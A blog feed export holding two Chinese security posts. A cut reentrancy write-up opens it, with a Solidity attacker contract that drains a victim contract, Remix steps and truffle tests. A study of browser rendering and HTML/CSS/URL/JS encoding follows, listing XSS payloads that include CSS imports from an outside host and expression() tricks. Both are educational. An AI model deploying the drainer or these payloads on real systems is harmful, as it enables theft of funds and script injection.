class="title">payable</span> </span>&#123;</div><div class="line">        <span class="comment">//计数</span></div><div class="line">        number++;</div><div class="line">        <span class="comment">//不一定是donate金额的倍数，榨干每一点钱</span></div><div class="line">        uint weHave = c.balanceOf(<span class="keyword">this</span>);</div><div class="line">        <span class="keyword">if</span> (weHave &gt; c.balance) &#123;</div><div class="line">            <span class="keyword">if</span> (c.balance != <span class="number">0</span>) c.withdraw(c.balance);</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line">        c.withdraw(weHave);</div><div class="line">    &#125;</div><div class="line">    <span class="comment">//调用withdraw，需要两次以上的调用，目前不知道原因</span></div><div class="line">    <span class="comment">//此处参数可以为0。但是不意味着可以不donate。一次性转钱的最大值就是donate的金额</span></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</div><div class="line">        c.withdraw(<span class="number">0</span>);</div><div class="line">        c.withdraw(<span class="number">0</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="comment">//提取参数至合约拥有者</span></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getmoney</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</div><div class="line">      owner.transfer(<span class="keyword">this</span>.balance);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>利用Remix的操作步骤</p>
<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fuud2btqddj30aa0660ss.jpg" alt="cr6.png"></p>
<p>创建合约</p>
<ul>
<li>前者填写创建合约时，附加的金额，用于donate。</li>
<li>后者填写目标合约address</li>
</ul>
<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fuud2g147zj30a6059t8n.jpg" alt="cr7.png"></p>
<p>攻击 -&gt; 拿钱</p>
<p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fuud2k3e27j311w0hwjuc.jpg" alt="cr5.png"></p>
<p>提交</p>
<h2 id="基于truffle-本地测试"><a href="#基于truffle-本地测试" class="headerlink" title="基于truffle 本地测试"></a>基于truffle 本地测试</h2><p>下面是利用 <code>truffle</code> + <code>ganache</code> 利用 <code>truffle test</code> 进行本地测试的代码。没有遇到Remix环境下的坑，不知道是链的问题，还是编译器的问题。记录一下过程。</p>
<p>设置部署文件 <code>2_deploy_contracts.js</code>：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> Victim = artifacts.require(<span class="string">'./Victim.sol'</span>)</div><div class="line"><span class="keyword">const</span> Attacker = artifacts.require(<span class="string">'./Attacker.sol'</span>)</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">deployer</span>) </span>&#123;</div><div class="line">  deployer</div><div class="line">    .deploy(Victim)</div><div class="line">    .then(<span class="function"><span class="params">()</span> =&gt;</span></div><div class="line">      deployer.deploy(Attacker, Victim.address)</div><div class="line">    )</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>链接至ganache测试链，<code>truffle.js</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">  <span class="comment">// See &lt;http://truffleframework.com/docs/advanced/configuration&gt;</span></div><div class="line">  <span class="comment">// to customize your Truffle configuration!</span></div><div class="line">  networks: &#123;</div><div class="line">    development: &#123;</div><div class="line">      <span class="comment">// host: "10.21.238.12",</span></div><div class="line">      <span class="comment">// port: 8545,</span></div><div class="line">      host: <span class="string">'localhost'</span>,</div><div class="line">      port: <span class="number">7545</span>,</div><div class="line">      network_id: <span class="string">"*"</span> <span class="comment">// Match any network id</span></div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p><code>test.js</code>基于js的测试脚本：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> attacker = artifacts.require(<span class="string">"Attacker"</span>);</div><div class="line"><span class="keyword">const</span> victim = artifacts.require(<span class="string">"Victim"</span>);</div><div class="line"></div><div class="line">contract(<span class="string">'test'</span>, <span class="keyword">async</span> (accounts) =&gt; &#123;</div><div class="line">    it(<span class="string">"should put 10 in attacker"</span>, <span class="keyword">async</span> () =&gt; &#123;</div><div class="line">        <span class="keyword">let</span> instance_att = <span class="keyword">await</span> attacker.deployed();</div><div class="line">        acct1 = accounts[<span class="number">0</span>]</div><div class="line">        <span class="keyword">let</span> getBalance = web3.eth.getBalance;</div><div class="line">        <span class="keyword">let</span> options = &#123; <span class="attr">from</span>: acct1, <span class="attr">to</span>: attacker.address, <span class="attr">value</span>: <span class="number">20</span> &#125;</div><div class="line">        <span class="keyword">let</span> result= <span class="keyword">await</span> instance_att.donate.sendTransaction(options)</div><div class="line">        <span class="comment">// console.log(result);</span></div><div class="line">        <span class="built_in">console</span>.log(getBalance(attacker.address))</div><div class="line">        assert.equal(getBalance(attacker.address), <span class="number">20</span>);</div><div class="line">     &#125;),</div><div class="line">     it(<span class="string">"should put 100 in victim"</span>, <span class="keyword">async</span> () =&gt; &#123;</div><div class="line">        <span class="keyword">let</span> instance = <span class="keyword">await</span> victim.deployed();</div><div class="line">        acct1 = accounts[<span class="number">0</span>]</div><div class="line">        <span class="keyword">let</span> getBalance = web3.eth.getBalance;</div><div class="line">        <span class="keyword">let</span> options = &#123; <span class="attr">from</span>: acct1, <span class="attr">to</span>: victim.address, <span class="attr">value</span>: <span class="number">100</span> &#125;</div><div class="line">        <span class="keyword">let</span> result= web3.eth.sendTransaction(options)</div><div class="line">        <span class="comment">// console.log(result);</span></div><div class="line">        <span class="built_in">console</span>.log(getBalance(victim.address))</div><div class="line">        assert.equal(getBalance(victim.address), <span class="number">100</span>);</div><div class="line">     &#125;),</div><div class="line">    <span class="comment">//  it("show attacker and victim", async () =&gt; &#123;</span></div><div class="line">    <span class="comment">//     let getBalance = web3.eth.getBalance;</span></div><div class="line">    <span class="comment">//     console.log(getBalance(victim.address))</span></div><div class="line">    <span class="comment">//     console.log(getBalance(attacker.address))</span></div><div class="line">    <span class="comment">//     assert.equal(getBalance(victim.address), 100);</span></div><div class="line">    <span class="comment">//  &#125;),</span></div><div class="line">     it(<span class="string">"attack_ready (transfer 10)"</span>, <span class="keyword">async</span> () =&gt; &#123;</div><div class="line">        <span class="keyword">let</span> instance_att = <span class="keyword">await</span> attacker.deployed();</div><div class="line">        <span class="keyword">let</span> instance_vic = <span class="keyword">await</span> victim.deployed();</div><div class="line">        <span class="built_in">console</span>.log(attacker.address)</div><div class="line">        <span class="built_in">console</span>.log(accounts[<span class="number">0</span>])</div><div class="line">        <span class="keyword">let</span> getBalance = web3.eth.getBalance;</div><div class="line">        <span class="keyword">let</span> result = <span class="keyword">await</span> instance_att.transfer.sendTransaction(victim.address,<span class="number">10</span>)</div><div class="line">        <span class="keyword">let</span> result2 = <span class="keyword">await</span> instance_vic.balanceOf.call(attacker.address,&#123;<span class="attr">from</span>: attacker.address&#125;)</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">"balanceOfAttack in vic:"</span>+result2)</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">"balanceOfvictim:"</span>+getBalance(victim.address))</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">"balanceOfAttack:"</span>+getBalance(attacker.address))</div><div class="line">        assert.equal(getBalance(victim.address), <span class="number">110</span>);</div><div class="line">     &#125;),</div><div class="line">     it(<span class="string">"attack (get 20)"</span>, <span class="keyword">async</span> () =&gt; &#123;</div><div class="line">        <span class="keyword">let</span> instance_att = <span class="keyword">await</span> attacker.deployed();</div><div class="line">        <span class="keyword">let</span> instance_vic = <span class="keyword">await</span> victim.deployed();</div><div class="line"></div><div class="line">        <span class="keyword">let</span> getBalance = web3.eth.getBalance;</div><div class="line">        <span class="keyword">let</span> result = <span class="keyword">await</span> instance_att.attack()</div><div class="line"></div><div class="line">        <span class="keyword">let</span> result2 = <span class="keyword">await</span> instance_vic.balanceOf.call(attacker.address,&#123;<span class="attr">from</span>: attacker.address&#125;)</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">"balanceOfAttack in vic:"</span>+result2)</div><div class="line"></div><div class="line">        <span class="built_in">console</span>.log(<span class="string">"balanceOfvictim:"</span>+getBalance(victim.address))</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">"balanceOfAttack:"</span>+getBalance(attacker.address))</div><div class="line">        assert.equal(getBalance(victim.address), <span class="number">90</span>);</div><div class="line">     &#125;)</div><div class="line">&#125;)</div></pre></td></tr></table></figure></p>
<p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fuud2rkcqtj30fn09qdga.jpg" alt="cr8.png"></p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>重入漏洞形成原因：</p>
<ul>
<li>使用<code>call.value</code>转账，会发送全部Gas，为重入循环转账提供了条件</li>
<li>资产记录的改变，在实际转账后。漏洞的关键点。</li>
</ul>
<p>重入漏洞修补：</p>
<ul>
<li>资产记录的改变，在实际转账前。</li>
<li>不使用<code>call.value</code>，使用<code>transfer</code></li>
<li>使用安全的加减函数，捕获溢出，形成回滚。</li>
</ul>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://medium.com/@JusDev1988/reentrancy-attack-on-a-smart-contract-677eae1300f2" target="_blank" rel="external">https://medium.com/@JusDev1988/reentrancy-attack-on-a-smart-contract-677eae1300f2</a><br><a href="https://bbs.pediy.com/thread-228422.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-228422.htm</a><br><a href="https://blog.riskivy.com/%e6%99%ba%e8%83%bd%e5%90%88%e7%ba%a6ctf%ef%bc%9aethernaut-writeup-part-2/" target="_blank" rel="external">https://blog.riskivy.com/%e6%99%ba%e8%83%bd%e5%90%88%e7%ba%a6ctf%ef%bc%9aethernaut-writeup-part-2/</a><br><a href="https://www.secpulse.com/archives/73682.html" target="_blank" rel="external">https://www.secpulse.com/archives/73682.html</a></p>
]]></content>
      
        
        <tags>
            
            <tag> 区块链 </tag>
            
            <tag> solidity </tag>
            
            <tag> 安全 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[浏览器渲染原理与编码解码]]></title>
      <url>/2018/08/25/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/</url>
      <content type="html"><![CDATA[<p>— 被怼番之后，好好学习基础原理 —</p>
<a id="more"></a>
<hr>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>突然被电话面试了一波，在XSS这里被怼番了…是真滴菜还一直没有补，哎，潜心研究一下。</p>
<p>其中有问到浏览器渲染的原理，可以说是没有了解了。可能平常会使用到更相近的是在想办法过滤的时候，需要了解的渲染中URL,HTML,JS编码解码过程。</p>
<p>这两块内容有着千丝万缕，放在一起学习，记录。</p>
<hr>

<h1 id="浏览器渲染过程"><a href="#浏览器渲染过程" class="headerlink" title="浏览器渲染过程"></a>浏览器渲染过程</h1><p>看一个我觉得易于理解的webkit渲染主要流程：</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fult61719nj30hc081754.jpg" alt="s3.png"></p>
<p>加上js的作用如下：<br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fult6vvff2j30jg06baae.jpg" alt="s6.jpg"></p>
<p><strong>名词解释：</strong></p>
<ul>
<li><strong>DOM Tree</strong>：浏览器将HTML解析成树形的数据结构</li>
<li><strong>CSS Rule Tree(CSSOM)</strong>：浏览器将CSS解析成树形的数据结构。</li>
<li><strong>Render Tree</strong>：DOM和CSSOM合并后生成Render Tree（渲染树）。渲染树用来计算可见元素的布局并且作为将像素渲染到屏幕上的过程的输入。</li>
<li><strong>layout</strong>：Webkit中元素的定位称为布局</li>
<li><strong>reflow</strong>：Gecko中称为回流，重新渲染，第一次渲染也叫这个</li>
<li><strong>repaint</strong>：重绘，不改变布局改变样式时重绘。比reflow快</li>
</ul>
<ul>
<li><strong>DOMContentLoaded</strong>：仅当DOM加载完成，不包括样式表，图片，flash，触发 DOMContentLoaded 事件</li>
<li><strong>onload事件</strong>：当页面上所有的DOM，样式表，脚本，图片，flash都已经加载完成了， 触发 onload 事件。</li>
</ul>
<ul>
<li><strong>首屏时间</strong>：当浏览器显示第一屏页面所消耗的时间，在国内的网络条件下，通常一个网站，如果“首屏时间”在2秒以内是比较优秀的，5秒以内用户可以接受，10秒以上就不可容忍了。</li>
<li><strong>白屏时间</strong>：指浏览器开始显示内容的时间。</li>
</ul>
<p>首先知道，以上的步骤不是严格一步步完成的。<br>渲染引擎会力求尽快将内容显示在屏幕上。它不必等到整个 HTML 文档解析完毕之后，就会开始构建render树和设置布局。在不断接收和处理来自网络的其余内容的同时，渲染引擎会将部分内容解析并显示出来。</p>
<p>以下来慢慢说几个重要的细节</p>
<h2 id="HTML-gt-DOM树"><a href="#HTML-gt-DOM树" class="headerlink" title="HTML -&gt; DOM树"></a>HTML -&gt; DOM树</h2><p><code>HTML解析器</code> 负责 HTML 变为 DOM树 的构建,地址可以分为<strong>标记化</strong>和<strong>树构建</strong>两个阶段</p>
<p>具体步骤如下：</p>
<ul>
<li>字节转化为字符</li>
<li>确定特定字符 tokens</li>
<li>将tokens 转化为 节点</li>
<li>以 Document 为根节点构建DOM树</li>
</ul>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fult5nzvy2j30v70ha0ti.jpg" alt="s1.png"></p>
<blockquote>
<p>DOM 树的构建过程是一个深度遍历过程：当前节点的所有子节点都构建好后才会去构建当前节点的下一个兄弟节点。 </p>
</blockquote>
<h3 id="css"><a href="#css" class="headerlink" title="css"></a>css</h3><p>在html文档的 head 中遇到了一个 link 标记，该标记引用一个外部css，浏览器会立即发出对该资源的请求</p>
<blockquote>
<p>由于 HTML解析构建和CSS的解析是相互独立的并不会造成冲突，因此我们通常将css样式放在head中，让浏览器尽早解析css。</p>
</blockquote>
<h3 id="js"><a href="#js" class="headerlink" title="js"></a>js</h3><p>在html文档中 html解析器遇到一个script标记，他会阻塞DOM树的构建，开始下载js，然后将控制权移交给JavaScript引擎解析，执行。等 JavaScript 引擎运行完毕，浏览器会从中断的地方恢复 DOM 构建。</p>
<blockquote>
<p>因为js是可能会改变html现有结构，浏览器会在js执行后决定当前文档是否需要进行重新渲染或者重排，所以会堵塞。因此，js引用放在前面会推迟页面首绘时间。</p>
</blockquote>
<h2 id="CSS-gt-CSSOM树"><a href="#CSS-gt-CSSOM树" class="headerlink" title="CSS -&gt; CSSOM树"></a>CSS -&gt; CSSOM树</h2><p><strong>CSS解释器</strong>为页面上任何对象计算样式时，浏览器都会从适用于该节点的最通用规则开始（body元素子项，应用虽有body样式），然后规则“向下级联”，以递归的方式优化计算样式。</p>
<p>构建过程与html相似：</p>
<ul>
<li>字符 确定特定字符 tokens</li>
<li>将tokens 转化为 节点</li>
<li>构建cssom树</li>
</ul>
<p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fult5wio0vj30t70e3dld.jpg" alt="s2.png"></p>
<blockquote>
<p>css解析过程，自右向左逆向解析。「div div p em」先匹配 em 开始。这样速度快<br>所以css层数嵌套越多，越慢</p>
</blockquote>
<h2 id="CSSOM-DOM-gt-render树"><a href="#CSSOM-DOM-gt-render树" class="headerlink" title="CSSOM + DOM -&gt; render树"></a>CSSOM + DOM -&gt; render树</h2><p>DOM 树与 CSSOM树 合并后形成 <strong>render（渲染）树</strong>。有了Render Tree，浏览器已经能知道网页中有哪些节点、各个节点的CSS定义以及他们的从属关系。</p>
<p><strong>生成过程</strong>：<br>遍历每个DOM树中的node节点，在CSSOM规则树中寻找当前节点的样式，生成渲染树。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fult6fs4oij30vy0exjuc.jpg" alt="s4.png"></p>
<p>注意。不可见的DOM元素不会被插入渲染树。（head元素，disply值为none的隐藏DOM元素 不在渲染树中出现，visibility属性为hidden 的元素将出现在渲染树中）</p>
<h2 id="布局-loyout-reflow"><a href="#布局-loyout-reflow" class="headerlink" title="布局 loyout/reflow"></a>布局 loyout/reflow</h2><p>当渲染对象被创建并添加到树中，它们并没有位置和大小，计算这些值的过程称为<strong>layout</strong>或<strong>reflow</strong>。</p>
<p>Html使用基于流的布局模型，意味着大部分时间，可以以单一的途径进行几何计算。流中靠后的元素并不会影响前面元素的几何特性，所以布局可以在文档中从右向左、自上而下的进行。也存在一些例外，比如html tables。</p>
<p>布局是一个递归的过程，由根渲染对象开始，它对应html文档元素，布局继续递归的通过一些或所有的frame层级，为每个需要几何信息的渲染对象进行计算。</p>
<p>当 render tree 发生变化时则会重新layout、reflow</p>
<h3 id="全局、增量"><a href="#全局、增量" class="headerlink" title="全局、增量"></a>全局、增量</h3><p>layout、reflow也有不同的方式。<br>当layout在整棵渲染树触发时，称为<strong>全局layout</strong>。包括全局样式的改变，窗口resize等，窗口resize会马上进行reflow</p>
<p>有些操作浏览器并不会立刻reflow 或 repaint 一次，而是会把这样的操作积攒一批，然后做一次 reflow，这又叫异步 reflow 或增量异步 reflow</p>
<h2 id="绘制-Painting"><a href="#绘制-Painting" class="headerlink" title="绘制 Painting"></a>绘制 Painting</h2><p>绘制阶段，遍历渲染树并调用渲染对象的paint方法将它们的内容显示在屏幕上，绘制使用UI基础组件。</p>
<p>也分为全局绘制，与增量绘制一块矩形区域。<br>除此之外绘制还有特定的顺序，此处不多说。</p>
<hr>

<h1 id="渲染过程的解码过程"><a href="#渲染过程的解码过程" class="headerlink" title="渲染过程的解码过程"></a>渲染过程的解码过程</h1><h2 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h2><p>给出一些常见的HTML实体编码，详细<a href="http://www.w3school.com.cn/tags/html_ref_ascii.asp" target="_blank" rel="external">ASCII常用参考</a>  <a href="http://www.w3school.com.cn/tags/html_ref_entities.html" target="_blank" rel="external">ISO参考</a></p>
<table>
<thead>
<tr>
<th style="text-align:center">结果</th>
<th style="text-align:center">实体名称</th>
<th style="text-align:center">实体编码</th>
<th>16进制实体编码</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>&quot;</code></td>
<td style="text-align:center"><code>&amp;quot;</code></td>
<td style="text-align:center"><code>&amp;#34;</code></td>
<td><code>&amp;#x22;</code></td>
</tr>
<tr>
<td style="text-align:center"><code>&#39;</code></td>
<td style="text-align:center"><code>&amp;apos;</code></td>
<td style="text-align:center"><code>&amp;#39;</code></td>
<td><code>&amp;#x27;</code></td>
</tr>
<tr>
<td style="text-align:center"><code>&amp;</code></td>
<td style="text-align:center"><code>&amp;amp;</code></td>
<td style="text-align:center"><code>&amp;#38;</code></td>
<td><code>&amp;#x26;</code></td>
</tr>
<tr>
<td style="text-align:center"><code>:</code></td>
<td style="text-align:center"></td>
<td style="text-align:center"><code>&amp;#58;</code></td>
<td><code>&amp;#x3A;</code></td>
</tr>
<tr>
<td style="text-align:center"><code>&lt;</code></td>
<td style="text-align:center"><code>&amp;lt;</code></td>
<td style="text-align:center"><code>&amp;#60;</code></td>
<td><code>&amp;#x3C;</code></td>
</tr>
<tr>
<td style="text-align:center"><code>=</code></td>
<td style="text-align:center"></td>
<td style="text-align:center"><code>&amp;#61;</code></td>
<td><code>&amp;#x3D;</code></td>
</tr>
<tr>
<td style="text-align:center"><code>&gt;</code></td>
<td style="text-align:center"><code>&amp;gt;</code></td>
<td style="text-align:center"><code>&amp;#62;</code></td>
<td><code>&amp;#x3E;</code></td>
</tr>
<tr>
<td style="text-align:center"><code>?</code></td>
<td style="text-align:center"></td>
<td style="text-align:center"><code>&amp;#63;</code></td>
<td><code>&amp;#x3F;</code></td>
</tr>
</tbody>
</table>
<p>浏览器最早开始解析HTML，将标签转化为内容树中的DOM 节点，此时识别标签的时候，HTML 解析器是无法识别那边被实体编码的内容的，即 HTML解析器 不会做解码的工作。</p>
<p>只有建立起DOM 树，才能对每个节点的内容进行识别，这时候如果出现实体编码，则会进行实体解码。<br>但是这时候解析出来假如有新的标签，那么不会在加入DOM树,只是作为字符串处理。比如<code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code></p>
<p>并且不是所有节点内容都会进行实体解码，比如<code>&lt;script&gt;</code>里面的代码</p>
<p>以上对于标签的识别，并不只是标签头本身，也包括其中的属性、结构等。</p>
<p>对于标签属性进行html编码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- 源码 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>&amp;#<span class="attr">x3d</span>;"<span class="attr">123</span>"&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"><span class="comment">&lt;!-- 渲染后右键源码 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>&amp;#<span class="attr">x3d</span>;"<span class="attr">123</span>"&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fult724cztj309n04wwe9.jpg" alt="s7.png"><br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fult6ov33uj30fx03p0sn.jpg" alt="s5.png"></p>
<p>点击后不会有跳转到<code>/123</code>页面，说明是不会解析的。标签本身也是同理。</p>
<p>对于标签内容进行html编码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- 源码 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x31;&amp;#x32;&amp;#x33;"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"><span class="comment">&lt;!-- 渲染后右键源码  --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x31;&amp;#x32;&amp;#x33;"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>虽然右键源码内容还是html编码的,但是实际可以跳转<br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fult7jzx45j30da03hglf.jpg" alt="s9.png"></p>
<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fult7qap6nj309900zwe9.jpg" alt="s10.png"></p>
<p>可以换一种更清楚的方式来看结果。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"JavaScript:alert('&amp;#x3C;OK&amp;#x3E;')"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fult7thytpj30l204xdfr.jpg" alt="s11.png"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- 测试时发现上面两种情况，不用; 作为编码结束，也可以识别 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x31&amp;#x32&amp;#x33"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure>
<p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fult7852h9j30et03x3yd.jpg" alt="s8.png"></p>
<p>虽然会有报错说明，但是也是可以识别的。</p>
<h2 id="CSS编码"><a href="#CSS编码" class="headerlink" title="CSS编码"></a>CSS编码</h2><p>由于CSS通过expression方法控制js，但是只有在IE浏览器中可以使用，但是也已经很早就废弃了，只做一些简单的了解。<br>除此之外还可以通过引入外部链接，文件，url地址来执行js脚本</p>
<p><strong>CSS 编码解析</strong>是用了一套不太正统的转义策略：<strong>用一个反斜杠，后边跟1~6位十六进制数字构成。</strong>，所以字母e 可以编码为 \65, \065,\000065。</p>
<p>而因为这样，后边就不能直接紧跟数字或字母，否则会被当成转义里的内容处理，所以CSS 选择了空格作为终止标识，在解码的时候，再将空格去除。</p>
<p>CSS还支持直接使用反斜杠对非十六进制字符进行转义的方式，就按紧跟着反斜杠后边的字符的字面意思进行解释，这种机制可用来转义引号和反斜杠本身，不过不能转义HTML 控制的字符，比如尖括号，那是因为HTML 解析器总是先于CSS 解析器。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="undefined">@import'http://ha.ckers.org/xss.css';</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"><span class="selector-tag">BODY</span>&#123;<span class="attribute">-moz-bingding</span>:<span class="built_in">url</span>(<span class="string">"http://ha.ckers.org/xssmoz.xml#xss"</span>)&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"background-image: url(javascript:alert('xss'))"</span>&gt;</span></div><div class="line"><span class="comment">&lt;!-- IE低版本 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"color:expression(alert(1));"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"color:expression\028 alert \028 1 \029 \029;"</span>&gt;</span></div></pre></td></tr></table></figure>
<h2 id="URL解析"><a href="#URL解析" class="headerlink" title="URL解析"></a>URL解析</h2><p>我们都知道浏览器发送到服务器时，服务器会对url进行一次URL解析然后处理。</p>
<p>那么浏览器中也会进行对于URL的解析。<br>比如html中的<code>&lt;a&gt;</code>标签的<code>href</code>属性，url解析器会对href内部的内容进行一次url解析<br>js中的<code>window.open()</code>,url解析器会对括号内部的内容进行一次url解析</p>
<p>URL解析过程中的一个细节了，不能对伪协议类型进行任何的编码操作，否则URL解析器会认为它无类型。<br>这个协议类型的格式是<code>javascript:</code>不是只是<code>javascript</code></p>
<p>除此了<code>javascript:</code>伪协议可以执行js代码之外，还有IE下的<code>vbscript</code>,Mozilla下的<code>dataURL</code>(data:text/html;这里可以直接添加html的<code>&lt;script&gt;标签，会执行</code>)</p>
<h2 id="unicode编码-javascript解析器"><a href="#unicode编码-javascript解析器" class="headerlink" title="unicode编码 javascript解析器"></a>unicode编码 javascript解析器</h2><p>说明一些javascript解析器的入口：</p>
<ul>
<li><code>&lt;script&gt;</code>标签</li>
<li><code>onlick</code>等事件js的动作</li>
<li>url调用<code>javascript:</code>伪协议</li>
<li><code>css</code>调用引入文件，或url再间接引入javascript:</li>
<li><code>eval()</code>调用</li>
<li>定时器触发</li>
</ul>
<p><strong>Unicode转义序列</strong>：<code>&quot;\uXXXX&quot;</code>，表示一个字符，其中xxxx表示一个16进制数字，如 “&lt;” Unicode编码为 “\u003c”。</p>
<blockquote>
<p>js编码还有一种普通十六进制 \xAA</p>
</blockquote>
<p>Unicode转义序列出现的地方。从上下文来看，可以分为三个地方：字符串中，标识符名称中和控制字符中。</p>
<ul>
<li>字符串中：转义序列只会被解释为正规字符，而不是单引号，双引号或者换行符这些能够打破字符串上下文的字符。</li>
<li>标识符名称中：转义序列会被解码并解释为标识符名称的一部分，例如函数名，属性名等等。</li>
<li>控制字符中：转义序列将不会被解释成控制字符，而仅仅被解码并解析为标识符名称或者字符串常量。</li>
</ul>
<p>JavaScript解析时只有<strong>标识符名称</strong>不会被当做字符串，<strong>控制字符</strong>仅会被解析为标示符名称或者字符串</p>
